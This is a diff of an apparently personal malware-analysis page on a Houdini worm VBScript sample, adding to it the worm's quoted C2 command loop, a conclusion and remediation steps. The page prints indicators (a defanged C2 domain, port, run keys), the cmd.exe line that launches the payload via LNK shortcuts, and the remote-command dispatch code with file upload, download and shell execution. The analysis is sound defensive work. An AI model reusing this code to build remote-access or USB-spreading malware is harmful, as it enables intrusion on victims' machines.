@@ -39,7 +39,7 @@
             <p>Domain Name: diiimaria[.]zapto[.]org</p>
             <p>Protocol: HTTP</p>
             <p>Port: 1644</p>
-            <p>HKCU/HKLM Run Key: angry birds.vbe</p>
+            <p>HKCU/HKLM Run Key: angry birds</p>
             <p>Startup Folder: angry birds.vbe</p>
             <p>Be sure to check for hidden system files. Files and Folders on root of any USB will be marked as such and an lnk will be created to run the payload, then redirect to original file/folder.</p>
         </div>
@@ -873,7 +873,7 @@ if  drive.drivetype  = 1 then
         end if
         lnkobj.save()</code></pre>
         <p>This section quite simply replaces all files that aren't the vbe script or an lnk with a shortcut to the vbe script, then the actual folder.</p>
-        <p><b>The original files/folders become hidden system files.</b></p>
+        <p><b>The original files/folders become hidden system files and are replaced with malicious LNKs.</b></p>
         <p>Just like we saw in the initial images of the USB, but now with <b>all files and folders on root of the USB.</b></p>
         <p><code>cmd.exe /c start angry" "birds.vbe&start explorer original_folder</code></p>
         <pre>
@@ -900,7 +900,76 @@ if  drive.drivetype  = 1 then
             <li><strong>sleep</strong>- sleep a given number of milliseconds</li>
         </ul>
         <p>Note: "excecute" is not a typo.</p>
+        <p>The commands above are listed/parsed in the code below:</p>
+        <pre><code>response = ""
+response = post ("is-ready","")
+cmd = split (response,spliter)
+select case cmd (0)
+case "excecute"
+      param = cmd (1)
+      execute param
+case "update"
+      param = cmd (1)
+      oneonce.close
+      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
+      oneonce.write param
+      oneonce.close
+      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
+      wscript.quit 
+case "uninstall"
+      uninstall
+case "send"
+      download cmd (1),cmd (2)
+case "site-send"
+      sitedownloader cmd (1),cmd (2)
+case "recv"
+      param = cmd (1)
+      upload (param)
+case  "enum-driver"
+      post "is-enum-driver",enumdriver  
+case  "enum-faf"
+      param = cmd (1)
+      post "is-enum-faf",enumfaf (param)
+case  "enum-process"
+      post "is-enum-process",enumprocess   
+case  "cmd-shell"
+      param = cmd (1)
+      post "is-cmd-shell",cmdshell (param)  
+case  "delete"
+      param = cmd (1)
+      deletefaf (param) 
+case  "exit-process"
+      param = cmd (1)
+      exitprocess (param) 
+case  "sleep"
+      param = cmd (1)
+      sleep = eval (param)        
+end select
+
+wscript.sleep sleep
+
+wend</code></pre>
 </div></section>
+    <pre>
+
+    </pre>
+    <section class="findings"><div class="container">
+        <h2>Conclusion</h2>
+        <p>This sample of the Houdini worm has 2 major functions:</p>
+        <ul>
+            <li>Infection of other USBs</li>
+            <li>Remote Access / C2</li>
+        </ul>
+        <p>As of May 30, 2024, the C2 server is not online. However, if the domain came back online, this malware could result in ransomware, participation in DDoS attacks, and many more possibilities.</p>
+        <p>If you suspect that you may have been a victim of this malware, be sure to:</p>
+        <ul>
+            <li>Update Anti-Virus signatures.</li>
+            <li>Look for common persistence mechanisms and remove them (try out <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">AutoRuns</a> from Sysinternals).</li>
+            <li>Kill any actively running malicious processes.</li>
+            <li>Check for network connections made to known C2 addresses.</li>
+        </ul>
+        <p>If you have any additional questions, please feel free to contact me via email - jbarry3300@proton.me</p>
+    </div></section>
     <footer>
         <div class="container">
             <p>&copy; BarrySploit Github Pages</p>
